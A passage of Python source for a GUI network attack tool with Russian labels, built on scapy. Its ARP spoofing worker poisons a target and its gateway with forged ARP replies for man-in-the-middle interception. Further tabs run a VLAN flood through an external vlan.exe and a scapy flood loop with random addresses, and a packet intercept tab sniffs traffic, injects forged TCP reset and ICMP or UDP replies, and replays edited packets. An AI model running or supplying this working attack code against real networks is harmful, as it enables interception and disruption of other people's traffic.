        self.arp_spoof_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.arp_spoof_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.arp_spoof_log), width=14).pack()

        self.arp_spoof_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'last_update': 0,
            'last_sent': 0
        }
    
    def start_arp_spoof(self):
        self.arp_spoof_running = True
        self.arp_spoof_start_btn.config(state='disabled')
        self.arp_spoof_stop_btn.config(state='normal')
        
        try:
            interval = float(self.arp_spoof_interval.get())
        except:
            interval = 2.0
        
        self.arp_spoof_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.arp_spoof_thread = threading.Thread(
            target=self.arp_spoof_worker,
            args=(self.arp_target_ip.get(), self.arp_gateway_ip.get(), 
                  self.arp_spoof_interface.get(), interval)
        )
        self.arp_spoof_thread.daemon = True
        self.arp_spoof_thread.start()
        
        self.update_arp_spoof_stats()
        
        self.arp_spoof_log.insert('end', f"ARP Spoofing started (interval: {interval}s)\n")
        self.status_var.set("ARP Spoofing запущен")
    
    def stop_arp_spoof(self):
        self.arp_spoof_running = False
        self.arp_spoof_start_btn.config(state='normal')
        self.arp_spoof_stop_btn.config(state='disabled')
        
        if self.arp_spoof_thread and self.arp_spoof_thread.is_alive():
            self.arp_spoof_thread.join(timeout=1.0)
        
        total_time = time.time() - self.arp_spoof_stats['start_time']
        total_packets = self.arp_spoof_stats['sent_packets']
        total_bytes = total_packets * 42  # approx ARP packet size
        
        self.arp_spoof_log.insert('end', "\n--- Results ---\n")
        self.arp_spoof_log.insert('end', f"Total packets sent: {total_packets}\n")
        self.arp_spoof_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
        if total_time > 0:
            self.arp_spoof_log.insert('end', f"Avg rate: {int(total_packets/total_time)} pps\n")
        self.arp_spoof_log.insert('end', f"Total data: {total_bytes} bytes\n")
        if total_time > 0:
            self.arp_spoof_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
        
        self.status_var.set("ARP Spoofing остановлен")
    
    def update_arp_spoof_stats(self):
        if not self.arp_spoof_running:
            return
            
        current_time = time.time()
        duration = current_time - self.arp_spoof_stats['start_time']
        time_diff = current_time - self.arp_spoof_stats['last_update']
        
        if time_diff >= 1:
            packets_sent = self.arp_spoof_stats['sent_packets'] - self.arp_spoof_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            self.arp_spoof_rate.config(text=f"{int(current_rate)}")
            self.arp_spoof_stats['last_update'] = current_time
            self.arp_spoof_stats['last_sent'] = self.arp_spoof_stats['sent_packets']
        
        self.arp_spoof_sent.config(text=str(self.arp_spoof_stats['sent_packets']))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.arp_spoof_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.arp_spoof_running:
            self.root.after(1000, self.update_arp_spoof_stats)
    
    def arp_spoof_worker(self, target_ip, gateway_ip, interface, interval):
        try:
            packet_count = 0
            attacker_mac = get_if_hwaddr(interface)
            
            while self.arp_spoof_running:
                arp_to_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,
                    psrc=gateway_ip,
                    hwsrc=attacker_mac,
                    pdst=target_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                arp_to_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,
                    psrc=target_ip,
                    hwsrc=attacker_mac,
                    pdst=gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                sendp(arp_to_target, iface=interface, verbose=0)
                sendp(arp_to_gateway, iface=interface, verbose=0)
                packet_count += 2
                self.arp_spoof_stats['sent_packets'] = packet_count
                
                sleep_time = interval
                step = 0.1
                while sleep_time > 0 and self.arp_spoof_running:
                    time.sleep(min(step, sleep_time))
                    sleep_time -= step
        except Exception as e:
            self.arp_spoof_log.insert('end', f"ARP Spoofing error: {str(e)}\n")
    
    # ----- VLAN Flood Tab -----
    def setup_vlan_flood_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры VLAN flood")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        # Интерфейс
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.vlan_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.vlan_interface.pack(side='left', padx=2)
        self.vlan_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        # VLAN ID
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="VLAN ID:", width=12).pack(side='left', padx=2)
        self.vlan_id = ttk.Entry(row2, width=10, font=('Arial', 9))
        self.vlan_id.pack(side='left', padx=2)
        self.vlan_id.insert(0, "100")
        
        # Количество потоков
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Потоков:", width=12).pack(side='left', padx=2)
        self.vlan_threads = ttk.Entry(row3, width=10, font=('Arial', 9))
        self.vlan_threads.pack(side='left', padx=2)
        self.vlan_threads.insert(0, "4")
        
        # Время (сек)
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Время (сек):", width=12).pack(side='left', padx=2)
        self.vlan_duration = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.vlan_duration.pack(side='left', padx=2)
        self.vlan_duration.insert(0, "60")
        ttk.Label(row4, text="(0=бесконечно)").pack(side='left', padx=5)
        
        # Опции MAC
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        self.vlan_random_mac = tk.BooleanVar(value=False)
        ttk.Checkbutton(row5, text="Случайный MAC", variable=self.vlan_random_mac).pack(side='left', padx=5)
        
        row6 = ttk.Frame(params_frame)
        row6.pack(fill='x', padx=5, pady=5)
        ttk.Label(row6, text="Фикс. MAC:", width=12).pack(side='left', padx=2)
        self.vlan_fixed_mac = ttk.Entry(row6, width=25, font=('Arial', 9))
        self.vlan_fixed_mac.pack(side='left', padx=2)
        self.vlan_fixed_mac.insert(0, "")
        ttk.Label(row6, text="(оставьте пустым для автовыбора)").pack(side='left', padx=5)
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.vlan_start_btn = ttk.Button(button_frame, text="Начать VLAN flood", 
                                    command=self.start_vlan_flood, width=18)
        self.vlan_start_btn.pack(side='left', padx=5)
        
        self.vlan_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                    command=self.stop_vlan_flood, width=15, state='disabled')
        self.vlan_stop_btn.pack(side='left', padx=5)
        
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено кадров:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.vlan_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.vlan_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость (fps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.vlan_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.vlan_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.vlan_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.vlan_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог VLAN flood")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.vlan_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.vlan_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", 
                command=lambda: self.save_log(self.vlan_log), width=14).pack()
        
                
    def start_vlan_flood(self):
        if hasattr(self, 'vlan_attack_running') and self.vlan_attack_running:
            return
        
        self.vlan_attack_running = True
        self.vlan_start_btn.config(state='disabled')
        self.vlan_stop_btn.config(state='normal')
        
        try:
            interface = self.vlan_interface.get()
            vlan_id = int(self.vlan_id.get())
            threads = int(self.vlan_threads.get())
            duration = int(self.vlan_duration.get())
            random_mac = self.vlan_random_mac.get()
            fixed_mac = self.vlan_fixed_mac.get().strip()
        except ValueError:
            messagebox.showerror("Ошибка", "Проверьте введённые данные (числа)")
            self.vlan_attack_running = False
            self.vlan_start_btn.config(state='normal')
            return
        
        if vlan_id < 1 or vlan_id > 4094:
            messagebox.showerror("Ошибка", "VLAN ID должен быть от 1 до 4094")
            self.vlan_attack_running = False
            self.vlan_start_btn.config(state='normal')
            return
        
        if threads < 1:
            threads = 1
        
        exe_path = find_exe("vlan.exe")
        if not os.path.exists(exe_path):
            self.vlan_log.insert('end', "Error: vlan.exe not found!\n")
            self.vlan_attack_running = False
            self.vlan_start_btn.config(state='normal')
            return
        
        # Формируем аргументы
        args = [exe_path, interface, str(vlan_id), str(threads), str(duration)]
        
        if random_mac:
            args.append("--random-mac")
        elif fixed_mac:
            args.append("--src-mac")
            args.append(fixed_mac)
        # Если не random и не указан фикс, то программа сама подхватит MAC интерфейса
        
        self.vlan_log.delete(1.0, tk.END)
        self.vlan_log.insert('end', f"VLAN flood started\n")
        self.vlan_log.insert('end', f"Interface: {interface}\n")
        self.vlan_log.insert('end', f"VLAN ID: {vlan_id}\n")
        self.vlan_log.insert('end', f"Threads: {threads}\n")
        self.vlan_log.insert('end', f"Duration: {duration} sec\n")
        if random_mac:
            self.vlan_log.insert('end', "Random MAC: yes\n")
        elif fixed_mac:
            self.vlan_log.insert('end', f"Fixed MAC: {fixed_mac}\n")
        else:
            self.vlan_log.insert('end', "MAC: auto (interface)\n")
        
        self.vlan_stop_event = threading.Event()
        self.vlan_external_thread = threading.Thread(
            target=self.run_external_tool,
            args=(args, self.vlan_log, self.vlan_stop_event),
            kwargs={'infinite': (duration == 0), 'on_finish': self.on_vlan_finished},
            daemon=True
        )
        self.vlan_external_thread.start()
        
        self.vlan_stats['start_time'] = time.time()
        self.update_vlan_stats()
        
        self.status_var.set(f"VLAN flood started (VLAN {vlan_id})")

    def on_vlan_finished(self):
        self.vlan_attack_running = False
        self.vlan_start_btn.config(state='normal')
        self.vlan_stop_btn.config(state='disabled')
        self.status_var.set("VLAN flood finished")
        
    def stop_vlan_flood(self):
        if not self.vlan_attack_running:
            return
        
        # Устанавливаем событие остановки
        if self.vlan_stop_event:
            self.vlan_stop_event.set()
        
        # Для бесконечного режима посылаем Enter в процесс, если он жив
        if self.current_external_process and self.current_external_process.poll() is None:
            try:
                self.current_external_process.stdin.write('\n')
                self.current_external_process.stdin.flush()
            except:
                pass
            try:
                self.current_external_process.wait(timeout=1)
            except subprocess.TimeoutExpired:
                self.current_external_process.kill()
        
        self.vlan_attack_running = False
        self.vlan_start_btn.config(state='normal')
        self.vlan_stop_btn.config(state='disabled')
        self.status_var.set("VLAN flood stopped")
        # Статистика уже выведена процессом

    
    def update_vlan_stats(self):
        if not self.vlan_attack_running:
            return

        if self.vlan_attack_running:
            self.root.after(1000, self.update_vlan_stats)
    
    def run_vlan_flood(self, interface, vlan_min, vlan_max, src_mac, delay, total_count):
        frame_count = 0
        
        try:
            while self.vlan_attack_running and frame_count < total_count:
                current_vlan = random.randint(vlan_min, vlan_max)
                if src_mac:
                    ether = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
                else:
                    ether = Ether(src=self.generate_random_mac(), dst="ff:ff:ff:ff:ff:ff")
                vlan_tag = Dot1Q(vlan=current_vlan)
                src_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                dst_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                packet = ether / vlan_tag / IP(src=src_ip, dst=dst_ip) / ICMP() / b"VLAN Flood Test"
                try:
                    sendp(packet, iface=interface, verbose=0)
                    frame_count += 1
                    self.vlan_stats['sent_frames'] = frame_count
                    self.vlan_stats['unique_vlans'].add(current_vlan)
                except Exception as e:
                    self.vlan_log.insert('end', f"Send error: {str(e)[:50]}\n")
                if delay > 0:
                    time.sleep(delay)
        except Exception as e:
            self.vlan_log.insert('end', f"VLAN flood error: {str(e)}\n")
        finally:
            self.stop_vlan_flood()
    
    # ----- Packet Intercept Tab -----
    def setup_intercept_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='y', padx=5, pady=5)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры перехвата")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=4, pady=3)
        
        ttk.Label(row1, text="Интерфейс:").pack(side='left', padx=2)
        self.intercept_interface = ttk.Combobox(row1, width=15, font=('Arial', 9), values=self.network_interfaces)
        self.intercept_interface.pack(side='left', padx=2)
        self.intercept_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        ttk.Label(row1, text="Фильтр:").pack(side='left', padx=8)
        self.intercept_filter = ttk.Combobox(row1, width=18, font=('Arial', 9), values=[
            "icmp or tcp", "tcp", "udp", "icmp", "arp", "not arp", "not stp", 
            "port 80", "port 443", "host 192.168.1.1", "tcp port 80", "udp port 53"
        ])
        self.intercept_filter.pack(side='left', padx=2)
        self.intercept_filter.set("")
        
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=4, pady=3)
        
        ttk.Label(row2, text="Кол-во ответов:").pack(side='left', padx=2)
        self.intercept_response_count = ttk.Entry(row2, width=8, font=('Arial', 9))
        self.intercept_response_count.pack(side='left', padx=2)
        self.intercept_response_count.insert(0, "0")
        
        ttk.Label(row2, text="Кол-во для отпр.:").pack(side='left', padx=10)
        self.send_count = ttk.Entry(row2, width=8, font=('Arial', 9))
        self.send_count.pack(side='left', padx=2)
        self.send_count.insert(0, "10")
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=4, pady=6)
        
        self.intercept_start_btn = ttk.Button(button_frame, text="Начать перехват", 
                                        command=self.start_packet_intercept, width=14)
        self.intercept_start_btn.pack(side='left', padx=2)
        
        self.intercept_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                       command=self.stop_packet_intercept, width=12, state='disabled')
        self.intercept_stop_btn.pack(side='left', padx=2)
        
        ttk.Button(button_frame, text="Захватить выбранный", 
              command=self.capture_selected_intercept_packet, width=18).pack(side='left', padx=2)
        ttk.Button(button_frame, text="Редактировать", 
              command=self.edit_selected_intercept_packet, width=13).pack(side='left', padx=1)
        
        packets_frame = ttk.LabelFrame(left_frame, text="Перехваченные пакеты")
        packets_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        columns = ("№", "Время", "Источник", "Назначение", "Протокол", "Длина", "Информация")
        self.intercept_tree = ttk.Treeview(packets_frame, columns=columns, show='headings', height=12)
        
        for col in columns:
            self.intercept_tree.heading(col, text=col)
            self.intercept_tree.column(col, width=90)
        
        self.intercept_tree.column("№", width=40)
        self.intercept_tree.column("Время", width=80)
        self.intercept_tree.column("Источник", width=120)
        self.intercept_tree.column("Назначение", width=120)
        self.intercept_tree.column("Протокол", width=70)
        self.intercept_tree.column("Длина", width=50)
        self.intercept_tree.column("Информация", width=150)
        
        tree_scroll = ttk.Scrollbar(packets_frame, orient="vertical", command=self.intercept_tree.yview)
        self.intercept_tree.configure(yscrollcommand=tree_scroll.set)
        
        self.intercept_tree.pack(side='left', fill='both', expand=True)
        tree_scroll.pack(side='right', fill='y')
        
        control_frame = ttk.LabelFrame(right_frame, text="Управление пакетами")
        control_frame.pack(fill='x', padx=5, pady=5)
        
        info_frame = ttk.LabelFrame(control_frame, text="Текущие пакеты")
        info_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(info_frame, text="Захваченный:").pack(anchor='w', pady=1)
        self.captured_packet_info = ttk.Label(info_frame, text="Нет", wraplength=300)
        self.captured_packet_info.pack(anchor='w', pady=1, fill='x')
        
        ttk.Label(info_frame, text="Отредактированный:").pack(anchor='w', pady=1)
        self.edited_packet_info = ttk.Label(info_frame, text="Нет", wraplength=300)
        self.edited_packet_info.pack(anchor='w', pady=1, fill='x')
        
        send_frame = ttk.Frame(control_frame)
        send_frame.pack(fill='x', padx=5, pady=8)
        
        ttk.Button(send_frame, text="Отправить захваченный", 
              command=self.send_captured_packet, width=20).pack(pady=2)
        ttk.Button(send_frame, text="Отправить отредактированный", 
              command=self.send_edited_packet, width=20).pack(pady=2)
        
        ttk.Button(control_frame, text="Очистить список", 
              command=self.clear_intercept_list, width=20).pack(pady=5)
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог перехвата")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.intercept_log = scrolledtext.ScrolledText(log_frame, height=20, wrap=tk.WORD, font=('Consolas', 8))
        self.intercept_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(log_frame, text="Сохранить лог", 
              command=lambda: self.save_log(self.intercept_log), width=14).pack(pady=4)
        
        self.intercept_tree.bind('<<TreeviewSelect>>', self.on_intercept_packet_select)

    def on_intercept_packet_select(self, event):
        selection = self.intercept_tree.selection()
        if not selection:
            return
        item = selection[0]
        packet_info = self.intercept_tree.item(item, 'values')
        index = int(packet_info[0]) - 1
        if 0 <= index < len(self.intercept_packets):
            self.selected_packet = self.intercept_packets[index]
            self.intercept_log.insert('end', f"\n--- ВЫБРАН #{packet_info[0]} ---\n")
            self.intercept_log.insert('end', f"Время: {packet_info[1]}\n")
            self.intercept_log.insert('end', f"Источник: {packet_info[2]}\n")
            self.intercept_log.insert('end', f"Назначение: {packet_info[3]}\n")
            self.intercept_log.insert('end', f"Протокол: {packet_info[4]}\n")
            self.intercept_log.insert('end', f"Длина: {packet_info[5]} байт\n")
            self.intercept_log.insert('end', f"Информация: {packet_info[6]}\n")
            self.intercept_log.see('end')

    def capture_selected_intercept_packet(self):
        if not self.selected_packet:
            messagebox.showwarning("Предупреждение", "Сначала выберите пакет")
            return
        self.captured_packet = self.selected_packet
        self.captured_packet_info.config(text=f"Захвачен: {self.selected_packet.summary()}")
        self.intercept_log.insert('end', f"\nПакет захвачен: {self.selected_packet.summary()}\n")

    def edit_selected_intercept_packet(self):
        if not self.selected_packet:
            messagebox.showwarning("Предупреждение", "Сначала выберите пакет")
            return
        def callback(edited_packet, save_packet):
            if save_packet:
                self.edited_packet = edited_packet
                self.edited_packet_info.config(text=f"Отредактирован: {edited_packet.summary()}")
                self.intercept_log.insert('end', f"\nПакет сохранён: {edited_packet.summary()}\n")
        Editor(self.root, self.selected_packet, callback)

    def send_captured_packet(self):
        if self.captured_packet is None:
            self.intercept_log.insert('end', "Нет захваченного пакета для отправки!\n")
            return
        try:
            count = int(self.send_count.get())
            interface = self.intercept_interface.get()
            for i in range(count):
                sendp(self.captured_packet, iface=interface, verbose=0)
            self.intercept_log.insert('end', f"Отправлено {count} копий захваченного пакета\n")
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка отправки: {str(e)}\n")

    def send_edited_packet(self):
        if self.edited_packet is None:
            self.intercept_log.insert('end', "Нет отредактированного пакета для отправки!\n")
            return
        try:
            count = int(self.send_count.get())
            interface = self.intercept_interface.get()
            for i in range(count):
                sendp(self.edited_packet, iface=interface, verbose=0)
            self.intercept_log.insert('end', f"Отправлено {count} копий отредактированного пакета\n")
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка отправки: {str(e)}\n")

    def clear_intercept_list(self):
        for item in self.intercept_tree.get_children():
            self.intercept_tree.delete(item)
        self.intercept_packets.clear()
        self.intercept_log.insert('end', "Список пакетов очищен\n")

    def add_packet_to_intercept_tree(self, packet_data):
        packet_num, current_time, src, dst, protocol, length, info, packet = packet_data
        self.intercept_packets.append(packet)
        self.intercept_tree.insert("", "end", values=(packet_num, current_time, src, dst, protocol, length, info))
        if len(self.intercept_tree.get_children()) > 1000:
            self.intercept_tree.delete(self.intercept_tree.get_children()[0])
            self.intercept_packets.pop(0)

    def start_packet_intercept(self):
        self.packet_intercept_running = True
        self.intercept_start_btn.config(state='disabled')
        self.intercept_stop_btn.config(state='normal')
        self.intercept_thread = threading.Thread(
            target=self.intercept_worker,
            args=(self.intercept_filter.get(), self.intercept_interface.get())
        )
        self.intercept_thread.daemon = True
        self.intercept_thread.start()
        self.intercept_log.insert('end', "Перехват пакетов запущен\n")
        self.status_var.set("Перехват запущен")

    def stop_packet_intercept(self):
        self.packet_intercept_running = False
        self.intercept_start_btn.config(state='normal')
        self.intercept_stop_btn.config(state='disabled')
        self.intercept_log.insert('end', "Перехват остановлен\n")
        self.status_var.set("Перехват остановлен")

    def get_packet_info(self, packet):
        src = "Unknown"
        dst = "Unknown"
        protocol = "Unknown"
        length = len(packet)
        info = ""
        if packet.haslayer(Ether):
            src = packet[Ether].src
            dst = packet[Ether].dst
        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            protocol = "IP"
            if packet.haslayer(TCP):
                protocol = "TCP"
                info = f"Ports: {packet[TCP].sport}->{packet[TCP].dport} Flags: {packet[TCP].flags}"
            elif packet.haslayer(UDP):
                protocol = "UDP" 
                info = f"Ports: {packet[UDP].sport}->{packet[UDP].dport}"
            elif packet.haslayer(ICMP):
                protocol = "ICMP"
                info = f"Type: {packet[ICMP].type} Code: {packet[ICMP].code}"
        elif packet.haslayer(ARP):
            protocol = "ARP"
            info = f"Operation: {packet[ARP].op}"
        return (src, dst, protocol, length, info)

    def intercept_worker(self, filter_str, interface):
        def intercept_handler(packet):
            if not self.packet_intercept_running:
                return
            timestamp = time.strftime("%H:%M:%S")
            self.intercept_log.insert('end', f"[{timestamp}] Перехвачен: {packet.summary()}\n")
            src, dst, proto, length, info = self.get_packet_info(packet)
            num = len(self.intercept_tree.get_children()) + 1
            data = (num, timestamp, src, dst, proto, length, info, packet)
            self.root.after(0, self.add_packet_to_intercept_tree, data)
            try:
                resp_count = int(self.intercept_response_count.get())
            except:
                resp_count = 4
            for i in range(resp_count):
                resp = self.create_response_packet(packet)
                if resp:
                    try:
                        sendp(resp, iface=interface, verbose=0)
                        self.intercept_log.insert('end', f"  -> Ответ {i+1} отправлен\n")
                    except Exception as e:
                        self.intercept_log.insert('end', f"  -> Ошибка ответа: {str(e)}\n")
        try:
            sniff(filter=filter_str, iface=interface, prn=intercept_handler,
                  stop_filter=lambda x: not self.packet_intercept_running)
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка сниффинга: {str(e)}\n")

    def create_response_packet(self, original_packet):
        try:
            if original_packet.haslayer(ICMP) and original_packet[ICMP].type == 8:
                return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/ICMP(type=0, id=original_packet[ICMP].id, seq=original_packet[ICMP].seq)
            elif original_packet.haslayer(TCP):
                return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/TCP(
                    sport=original_packet[TCP].dport, 
                    dport=original_packet[TCP].sport,
                    flags="RA",
                    seq=random.randint(1000, 9000),
                    ack=original_packet[TCP].seq + 1
                )
            elif original_packet.haslayer(UDP):
                return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/UDP(
                    sport=original_packet[UDP].dport,
                    dport=original_packet[UDP].sport
                )/b"Response"
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка создания ответа: {str(e)}\n")
        return None

    # ----- Access Tab -----
    def setup_access_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        top_frame = ttk.Frame(main_frame)
        top_frame.pack(fill='x', padx=5, pady=5)
        
        input_frame = ttk.LabelFrame(top_frame, text="Базовые функции доступа")
        input_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(input_frame, text="IP адрес:").grid(row=0, column=0, padx=4, pady=3, sticky='w')
        self.access_ip = ttk.Entry(input_frame, width=18, font=('Arial', 9))
        self.access_ip.grid(row=0, column=1, padx=4, pady=3, sticky='w')
        self.access_ip.insert(0, "192.168.1.1")
        
        button_frame1 = ttk.Frame(input_frame)
        button_frame1.grid(row=1, column=0, columnspan=4, pady=6)
        ttk.Button(button_frame1, text="ICMP Ping", command=self.run_ping, width=12).pack(side='left', padx=3)
        ttk.Button(button_frame1, text="Port Scan", command=self.run_port_scan, width=12).pack(side='left', padx=3)
        ttk.Button(button_frame1, text="Traceroute", command=self.run_traceroute, width=12).pack(side='left', padx=3)
        
        button_frame2 = ttk.Frame(input_frame)
        button_frame2.grid(row=2, column=0, columnspan=4, pady=6)
        ttk.Button(button_frame2, text="Таблица маршрутизации", command=self.show_ip_route, width=20).pack(side='left', padx=2)
        ttk.Button(button_frame2, text="Сетевые адаптеры", command=self.show_network_info, width=18).pack(side='left', padx=2)
        
        output_frame = ttk.LabelFrame(main_frame, text="Результаты")
        output_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.access_output = scrolledtext.ScrolledText(output_frame, height=18, wrap=tk.WORD, font=('Consolas', 8))
        self.access_output.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(output_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.access_output), width=14).pack(pady=4)
    
    def get_network_adapters(self):
        try:
            interfaces = get_if_list()
            result = []
            for iface in interfaces:
                display_name = iface
                if not iface.startswith(r'\Device\NPF_'):
                    display_name = r'\Device\NPF_' + iface
                result.append(f"Интерфейс: {display_name}")
                try:
                    ip = get_if_addr(iface)
                    mac = get_if_hwaddr(iface)
                    result.append(f"  IP: {ip}, MAC: {mac}")
                except:
                    result.append(f"  Не удалось получить информацию")
                result.append("")
            return "\n".join(result)
        except Exception as e:
            return f"Ошибка получения сетевых адаптеров: {str(e)}"

    def get_ip_route_formatted(self):
        """
        Возвращает отформатированную таблицу маршрутизации IPv4.
        Используется прямой вывод route print с фильтрацией IPv6 строк.
        """
        try:
            result = subprocess.run(['route', 'print'], capture_output=True, text=True, encoding='cp866', errors='replace')
            lines = result.stdout.split('\n')
            
            # Ищем начало секции IPv4 и собираем строки до начала IPv6
            ipv4_section = []
            in_ipv4 = False
            for line in lines:
                if "IPv4 таблица маршрута" in line or "IPv4 Route Table" in line:
                    in_ipv4 = True
                    continue
                if in_ipv4 and ("IPv6 таблица маршрута" in line or "IPv6 Route Table" in line):
                    break
                if in_ipv4:
                    # Пропускаем пустые строки, но оставляем разделители для сохранения формата
                    if line.strip() or '=' in line:
                        ipv4_section.append(line.rstrip())
            
            if not ipv4_section:
                return "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\nНе удалось найти IPv4 маршруты.\n"
            
            # Добавляем заголовок и объединяем
            output = "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\n\n" + "\n".join(ipv4_section)
            return output
            
        except Exception as e:
            return f"=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\nОшибка: {str(e)}"
    def run_traceroute(self):
        def traceroute_worker():
            ip = self.access_ip.get()
            self.access_output.insert('end', f"Traceroute к {ip}...\n")
            self.access_output.see('end')
            
            try:
                if os.name == 'nt':
                    cmd = ['tracert', '-d', '-h', '30', '-w', '1000', ip]
                    encoding = 'cp866'  # для русской Windows
                else:
                    cmd = ['traceroute', '-n', '-m', '30', '-w', '1', ip]
                    encoding = 'utf-8'
                
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    encoding=encoding,
                    errors='replace',
                    bufsize=1
                )
                
                for line in iter(process.stdout.readline, ''):
                    self.access_output.insert('end', line)
                    self.access_output.see('end')
                    self.root.update()
                
                process.stdout.close()
                process.wait()
                
                self.access_output.insert('end', f"\nTraceroute завершен.\n")
                self.access_output.see('end')
                
            except Exception as e:
                self.access_output.insert('end', f"Ошибка Traceroute: {str(e)}\n")
        
        threading.Thread(target=traceroute_worker, daemon=True).start()

    def show_ip_route(self):
        def worker():
            self.access_output.insert('end', "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\n")
            route_info = self.get_ip_route_formatted()
            self.access_output.insert('end', route_info + "\n")
        threading.Thread(target=worker, daemon=True).start()

    def show_network_info(self):
        def worker():
            self.access_output.insert('end', "=== СЕТЕВЫЕ АДАПТЕРЫ ===\n")
            info = self.get_network_adapters()
            self.access_output.insert('end', info + "\n")
        threading.Thread(target=worker, daemon=True).start()

    def run_ping(self):
        def ping_worker():
            ip = self.access_ip.get()
